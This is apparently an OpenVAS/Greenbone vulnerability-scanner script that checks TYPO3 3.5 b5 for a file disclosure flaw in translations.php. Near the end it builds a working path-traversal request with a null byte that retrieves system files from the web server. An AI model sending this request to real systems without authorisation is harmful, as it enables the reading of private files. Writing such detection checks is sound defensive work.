CPE = "cpe:/a:typo3:typo3";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105141" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-12-12 12:00:00 +0100 (Fri, 12 Dec 2014)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 6985 );
	script_name( "TYPO3 Translations.php File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 SCHUTZWERK GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_typo3_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "TYPO3/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "This host is installed with TYPO3 and
  is prone to a file disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is able to get sensitive information." );
	script_tag( name: "insight", value: "TYPO3 does not sufficiently sanitize
  input submitted via URI parameters of potentially malicious data.
  This issue exists in the translations.php script." );
	script_tag( name: "impact", value: "By submitting a malicious web request
  to this script that contains a relative path to a resource and a null
  character (%00), it is possible to retrieve arbitrary files that are
  readable by the web server process." );
	script_tag( name: "affected", value: "TYPO3 3.5 b5" );
	script_tag( name: "solution", value: "Upgrade to TYPO3 version 3.5.0 or later." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/6985" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/313488" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://typo3.org/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/typo3/dev/translations.php?ONLY=" + crap( data: "%2e%2e/", length: 119 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

